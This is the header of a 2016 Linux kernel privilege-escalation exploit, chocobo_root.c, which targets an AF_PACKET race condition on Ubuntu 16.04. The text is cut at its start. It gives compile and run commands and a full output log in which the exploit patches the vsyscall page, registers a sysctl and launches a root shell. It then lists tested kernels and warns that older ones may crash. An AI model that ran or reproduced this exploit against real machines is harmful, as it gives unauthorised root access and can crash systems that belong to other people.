ocobo_root.c
linux AF_PACKET race condition exploit
exploit for Ubuntu 16.04 x86_64

user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
user@ubuntu:~$ ./chocobo_root

making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 174222, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 30773, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 133577, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

There are offsets included for older kernels, but they're untested
so be aware that this exploit will probably crash kernels older than 4.4.

tested on:
Ubuntu 16.04: 4.4.0-51-generic
Ubuntu 16.04: 4.4.0-47-generic
Ubuntu 16.04: 4.4.0-36-generic
Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu

Shoutouts to:
jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)
mcdelivery for delivering hotcakes and coffee

11/2016
by rebel

